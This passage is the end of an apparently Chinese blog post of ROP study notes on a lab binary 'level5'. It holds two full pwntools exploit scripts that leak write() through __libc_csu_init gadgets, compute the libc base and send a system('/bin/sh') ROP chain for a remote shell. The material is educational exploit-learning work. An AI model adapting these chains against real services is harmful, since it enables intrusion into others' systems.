class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/34.png" alt=""></p>
<p>当然，也可以不用LibcSearcher这个工具包，而是直接通过查询Libc Database Search的方式自己写地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400623</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write addr..."</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">## libc db search</span></span><br><span class="line"><span class="comment">## leak write low 3: 2b0</span></span><br><span class="line">system_offset = <span class="number">0x045390</span></span><br><span class="line">binsh_offset = <span class="number">0x18cd57</span></span><br><span class="line">write_offset = <span class="number">0x0f72b0</span></span><br><span class="line">libc_base = write_addr - write_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">exp += p64(pop_rdi_ret)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/36.png" alt=""></p>
<p>getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/35.png" alt=""></p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇</a></p>
<p><a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之Linux_x64篇</a></p>

</div>

<br>
<div><center>
  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
</center></div>


  <div class="book-comments">
    




  </div>


<script src="/js/book-post.js"></script>
        </div>
      </div>

      <div class="column col-2 hide-lg">
        <div class="book-toc">
  <div class="book-tocbot">
  </div>
  <div class="book-tocbot-menu">
    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
    <a onclick="go_top()">Back to top</a>
    <a onclick="go_bottom()">Go to bottom</a>
  </div>
</div>

<script>
tocbot.init({
  tocSelector: '.book-tocbot',
  contentSelector: '.book-post',
  headingSelector: 'h1, h2, h3, h4, h5',
  collapseDepth: 2,
  orderedList: false,
  scrollSmooth: false,
});

function expand_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 6,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "collapse_toc()");
  b.innerHTML = "Collapse all"
}

function collapse_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 2,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "expand_toc()");
  b.innerHTML = "Expand all"
}

function go_top() {
  window.scrollTo(0, 0);
}

function go_bottom() {
  window.scrollTo(0, document.body.scrollHeight);
}

</script>
      </div>
    </div>
  </div>
</div>

</body>
</html>
